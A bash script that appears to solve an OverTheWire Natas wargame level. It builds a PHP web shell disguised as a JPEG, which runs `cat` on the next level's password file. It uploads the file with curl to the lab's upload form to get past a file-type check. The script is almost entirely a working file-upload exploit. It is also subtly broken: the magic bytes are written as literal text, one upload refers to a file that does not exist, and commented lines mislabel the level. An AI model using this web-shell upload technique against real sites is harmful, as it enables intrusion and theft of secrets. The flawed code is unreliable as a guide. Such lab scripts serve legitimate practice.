#!/bin/bash
url="http://natas13.natas.labs.overthewire.org"
user="natas13"
pass=$(cat credentials/natas13)

file2upload="pwned.php.jpg"
echo "\xff\xd8\xff" > "$file2upload"
uploadfile=$(curl -s -X 'POST' -F 'uploadedfile=@pwned.php' -F 'filename=pwned.php' -u "$user:$pass" "$url" | html2text | grep  -oP '\(upload/.*?.php\)' | tr -d '()')

echo "<?php system('cat /etc/natas_webpass/natas14') ?>" >> "$file2upload"
echo "[*] uploading malicious php file: $file2upload"
cat $file2upload

#uploadfile=$(curl -s -X 'POST' -F 'uploadedfile=@pwned.php' -F 'filename=pwned.php' -u "$user:$pass" "$url" | html2text | grep  -oP '\(upload/.*?.php\)' | tr -d '()')

curl -v -X 'POST' -F "uploadedfile=@$file2upload" -F "filename=$file2upload" -u "$user:$pass" "$url" 

#echo "File uploaded $uploadfile"

#password=$(curl -s -u "$user:$pass" "$url/$uploadfile")

#echo "[+] password found for natas13: $password"

#echo $password > credentials/natas13
